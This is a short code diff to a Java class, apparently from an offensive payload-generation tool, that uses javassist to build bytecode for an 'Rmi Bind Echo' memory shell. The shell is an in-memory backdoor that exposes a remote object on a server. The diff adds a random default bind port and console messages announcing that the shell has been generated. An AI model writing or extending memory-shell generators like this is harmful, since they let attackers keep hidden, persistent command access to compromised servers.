@@ -5,11 +5,16 @@ import com.dto.ClassDto;
 import javassist.*;
 
 import java.util.ArrayList;
+import java.util.Random;
+
 import static com.Main.basePath;
 
 public class RmiBind {
 
     public static ClassDto bind(String rmiExObjPort) throws Exception {
+        Random random = new Random();
+        rmiExObjPort = rmiExObjPort == null ?  Integer.toString(random.nextInt(30000) + 12000) : rmiExObjPort;
+
         ClassPool classPool = new ClassPool();
         classPool.insertClassPath(basePath + "/jdk/*");
 
@@ -43,6 +48,9 @@ public class RmiBind {
         rmiBindEchoRegisterCtClass.setModifiers(rmiBindEchoRegisterCtClass.getModifiers() & ~Modifier.ABSTRACT);
         rmiBindEchoRegisterCtConstructor.getMethodInfo().rebuildStackMap(classPool);
 
+
+        System.out.println("[+] \"Rmi Bind Echo\" Memory Shell Generate: ");
+        System.out.println("[+] Remote Object Bind Port: " + rmiExObjPort);
         return new ClassDto(className, "invoke", rmiBindEchoRegisterCtClass.toBytecode());
     }
 }
